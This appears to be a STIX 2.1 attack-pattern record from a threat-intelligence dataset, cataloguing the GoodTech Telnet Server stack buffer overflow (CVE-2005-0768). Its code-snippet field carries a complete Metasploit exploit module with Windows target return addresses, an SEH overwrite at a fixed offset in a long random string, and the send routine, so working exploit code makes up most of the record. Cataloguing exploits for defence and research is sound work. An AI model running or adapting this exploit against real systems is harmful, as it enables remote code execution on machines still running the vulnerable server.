{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c07ca75-b037-416a-a3d0-7f7b3075e1fb",
    "created": "2024-08-14T16:39:01.583269Z",
    "modified": "2024-08-14T16:39:01.583274Z",
    "name": "GoodTech Telnet Server Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in GoodTech Systems Telnet Server versions prior to 5.0.7. By sending an overly long string, an attacker can overwrite the buffer and control program execution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/telnet/goodtech_telnet.rb",
            "external_id": "goodtech_telnet.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0768"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GoodTech Telnet Server Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack buffer overflow in GoodTech Systems Telnet Server\n          versions prior to 5.0.7. By sending an overly long string, an attacker can\n          overwrite the buffer and control program execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'MC',\n        'References' =>\n          [\n            [ 'CVE', '2005-0768' ],\n            [ 'OSVDB', '14806'],\n            [ 'BID', '12815' ],\n          ],\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'thread'\n          },\n        'Payload' =>\n          {\n            'Space' => 400,\n            'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n            'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\"\n          },\n        'Platform' => 'win',\n        'Targets' =>\n          [\n            [ 'Windows 2000 Pro English All', { 'Ret' => 0x75022ac4 } ],\n            [ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],\n          ],\n        'Privileged' => true,\n        'DisclosureDate' => '2005-03-15',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(2380)\n      ]\n    )\n  end\n\n  def exploit\n    connect\n\n    sploit = rand_text_english(10020, payload_badchars)\n    seh = generate_seh_payload(target.ret)\n\n    sploit[10012, seh.length] = seh\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sock.put(sploit + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-03-15",
    "x_mitre_platforms": [
        "win'"
    ]
}